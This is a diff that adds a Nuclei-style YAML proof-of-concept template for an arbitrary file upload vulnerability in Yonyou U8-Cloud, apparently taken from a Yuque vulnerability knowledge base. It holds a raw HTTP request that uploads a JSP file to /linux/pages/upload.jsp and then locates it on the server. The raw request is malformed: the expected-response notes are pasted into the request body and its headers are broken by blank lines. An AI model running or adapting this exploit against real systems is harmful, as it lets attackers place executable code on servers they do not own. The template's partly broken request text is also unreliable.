@@ -1,0 +1,54 @@
+id: poc-ppsgako1feecr2oe
+info:
+  name: 用友U8-Cloud 存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ppsgako1feecr2oe'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ppsgako1feecr2oe
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /linux/pages/upload.jsp HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Connection: close
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    filename: dude.jsp
+
+
+
+
+    <% out.println("dude");%>
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    success
+
+
+    # 上传文件定位
+
+    /linux/dude.jsp'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
